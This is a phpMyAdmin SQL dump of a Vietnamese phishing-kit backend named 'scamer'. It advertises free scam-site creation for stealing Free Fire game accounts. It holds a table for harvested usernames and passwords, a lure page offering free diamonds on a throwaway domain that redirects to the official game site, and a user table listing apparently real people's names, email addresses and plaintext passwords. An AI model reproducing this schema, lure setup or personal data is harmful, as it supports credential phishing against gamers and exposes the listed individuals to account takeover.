-- phpMyAdmin SQL Dump
-- version 4.9.7
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost:3306
-- Thời gian đã tạo: Th4 05, 2022 lúc 01:36 AM
-- Phiên bản máy phục vụ: 10.3.34-MariaDB-log-cll-lve
-- Phiên bản PHP: 7.3.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `ttaoshopaccga_scamer`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `password` varchar(30) NOT NULL,
  `email` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `admin`
--

INSERT INTO `admin` (`id`, `password`, `email`) VALUES
(1, 'Admin', 'Admin');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `caidat`
--

CREATE TABLE `caidat` (
  `id` int(11) NOT NULL,
  `tieude` varchar(555) NOT NULL,
  `logo` varchar(255) NOT NULL,
  `header` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `caidat`
--

INSERT INTO `caidat` (`id`, `tieude`, `logo`, `header`) VALUES
(1, 'Táº¡o Web Scam Miá»…n PhÃ­, Phising Scam Acc Free Fire KhÃ´ng Cáº§n Viáº¿t Code', 'https://img-anons1.wibu-team.com/wb-team-free-upload-1981364308.png', '');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `domain`
--

CREATE TABLE `domain` (
  `id` int(11) NOT NULL,
  `domain` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `scam_account`
--

CREATE TABLE `scam_account` (
  `id` int(11) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(30) NOT NULL,
  `uid` int(255) NOT NULL,
  `time` datetime(6) NOT NULL DEFAULT current_timestamp(6) ON UPDATE current_timestamp(6)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `scam_account`
--

INSERT INTO `scam_account` (`id`, `username`, `password`, `uid`, `time`) VALUES
(30, 'Admin13383763', 'hahahahaha', 9, '2022-04-04 23:26:02.373943');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `user`
--

CREATE TABLE `user` (
  `id` int(100) NOT NULL,
  `ten` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_vietnamese_ci NOT NULL,
  `email` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Đang đổ dữ liệu cho bảng `user`
--

INSERT INTO `user` (`id`, `ten`, `email`, `password`) VALUES
(9, 'NGUYEN HUU THANH', 'thanhda4329q@gmail.com ', 'Thanh2005'),
(10, 'anuniteit', 'myphuong7796@gmail.com', 'anuniteit'),
(12, 'nguyen vantrung', 'Hayngu119@gmail.com', '12345678'),
(13, 'thanh mÃºt cu phÃºc', 'thanhbucuphuc12@gmail.com', 'phucditthanh'),
(15, 'Tráº§n Äá»©c HÃ²a', 'lunmatu002x@gmail.com', 'matkhaula');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `web`
--

CREATE TABLE `web` (
  `id` int(11) NOT NULL,
  `tieude` varchar(255) NOT NULL,
  `domain` varchar(300) NOT NULL,
  `trangcuoi` varchar(955) NOT NULL,
  `giaodien` varchar(255) NOT NULL,
  `uid` varchar(255) NOT NULL,
  `videosex` varchar(955) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `web`
--

INSERT INTO `web` (`id`, `tieude`, `domain`, `trangcuoi`, `giaodien`, `uid`, `videosex`) VALUES
(28, 'Nháº­n Kim CÆ°Æ¡ng Miá»…n PhÃ­ !', 'tricker-fb.tk', 'Https://ff.garena.vn', 'Qua-Mien-Phi?MiniGame=', '9', '');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `caidat`
--
ALTER TABLE `caidat`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `domain`
--
ALTER TABLE `domain`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `scam_account`
--
ALTER TABLE `scam_account`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- Chỉ mục cho bảng `web`
--
ALTER TABLE `web`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT cho bảng `caidat`
--
ALTER TABLE `caidat`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT cho bảng `domain`
--
ALTER TABLE `domain`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT cho bảng `scam_account`
--
ALTER TABLE `scam_account`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- AUTO_INCREMENT cho bảng `user`
--
ALTER TABLE `user`
  MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT cho bảng `web`
--
ALTER TABLE `web`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
